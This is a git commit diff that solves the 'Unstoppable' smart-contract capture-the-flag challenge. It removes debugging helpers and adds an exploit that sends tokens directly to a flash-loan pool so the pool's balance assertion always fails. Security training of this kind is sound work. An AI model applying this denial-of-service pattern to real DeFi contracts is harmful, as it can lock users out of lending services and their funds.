d043c4adcc870059a0ac03e01175976645f906f5
karacurt <daniel-lima@usp.br>
2022-01-23 01:37:05 -0300

    unstoppable solved

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -3,7 +3,7 @@ const { expect } = require("chai");
 
 describe("[Challenge] Unstoppable", function () {
   let deployer, attacker, someUser;
-  let token, pool, receiverContract, fakeReceiver;
+  let token, pool, receiverContract;
   // Pool has 1M * 10**18 tokens
   const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
   const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther("100");
@@ -52,69 +52,16 @@ describe("[Challenge] Unstoppable", function () {
     fakeReceiver = await FakeReceiverContractFactory.deploy(pool.address);
   });
 
-  async function printBalances() {
-    const tokenPoolBalance = await token.balanceOf(pool.address);
-    const attackerBalance = await token.balanceOf(attacker.address);
-    const someUserBalance = await token.balanceOf(someUser.address);
-    const poolBalance = await pool.poolBalance();
-
-    console.group("######### Balances  ##########");
-
-    console.log("pool Balance", poolBalance.toString());
-    console.log("token PoolBalance", tokenPoolBalance.toString());
-    console.log("token AttackerBalance", attackerBalance.toString());
-    console.log("token SomeUserBalance", someUserBalance.toString());
-
-    console.groupEnd();
-    console.log("\n");
-  }
-
-  async function printAllowances() {
-    const attackerAllowance = await token.allowance(
-      attacker.address,
-      pool.address
-    );
-    const fakeReceriverAllowance = await token.allowance(
-      fakeReceiver.address,
-      pool.address
-    );
-    const someUserAllowance = await token.allowance(
-      someUser.address,
-      pool.address
-    );
-
-    console.group("checking allowances");
-    console.log("attacker allowance", attackerAllowance.toString());
-    console.log("fake receiver allowance", fakeReceriverAllowance.toString());
-    console.log("some user allowance", someUserAllowance.toString());
-    console.groupEnd();
-    console.log("\n");
-  }
-  async function approveAndDepositToPool(amount) {
-    await token.connect(attacker).approve(pool.address, amount);
-    await pool.connect(attacker).depositTokens(amount);
-  }
-
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
     const DEPOSIT_AMOUNT = ethers.utils.parseEther("99");
     console.log("DEPOSIT_AMOUNT", DEPOSIT_AMOUNT.toString());
 
-    await printBalances();
-
-    await approveAndDepositToPool(DEPOSIT_AMOUNT);
-    await printBalances();
-
-    console.log("fake receiving");
-    await printAllowances();
-    await fakeReceiver.connect(attacker).executeFlashLoan(DEPOSIT_AMOUNT);
-    await printBalances();
-    await printAllowances();
-
-    console.log("atacking");
-    //await fakeReceiver.connect(attacker).attack(token.address, DEPOSIT_AMOUNT);
-
-    //await pool.connect(attacker).flashLoan(10);
+    await token.connect(attacker).approve(attacker.address, DEPOSIT_AMOUNT);
+    await token
+      .connect(attacker)
+      .transferFrom(attacker.address, pool.address, DEPOSIT_AMOUNT);
+    //transfer before causes the pool to always rever on: - 40: assert(poolBalance == balanceBefore);
   });
 
   after(async function () {
